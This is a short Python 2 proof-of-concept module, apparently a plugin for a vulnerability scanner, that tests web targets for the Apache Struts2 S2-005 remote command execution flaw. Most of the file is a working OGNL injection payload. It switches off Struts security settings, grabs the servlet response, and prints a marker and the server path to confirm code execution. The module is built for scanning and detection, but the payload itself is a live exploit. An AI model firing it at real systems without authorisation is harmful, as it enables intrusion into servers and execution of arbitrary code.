#coding=utf-8
import requests
from lib import ttlscanlogger

def POC_INFO():
	dict_poc={};
	dict_poc["name"]="Struts2_005 RCE"
	dict_poc["Chinese_name"]="Struts2_005 远程命令执行漏洞"
	dict_poc["author"]="跳跳龙"
	return dict_poc

def POC(target_url):
    try:
        poc = "?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22tiaotiaolong_005\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_005' in result:
            # print "发现一处struts漏洞，漏洞类型：struts2-055。漏洞地址为" + target_url
            ttlscanlogger.logger.error("[+]Vuln: {0} has found Struts2_005 vulnerabillity ".format(target_url))
            return True
        # print result
        else:
            # print "此处尚未发现struts2-005类型漏洞"
            return False
    except Exception, e:
        # print e
        return False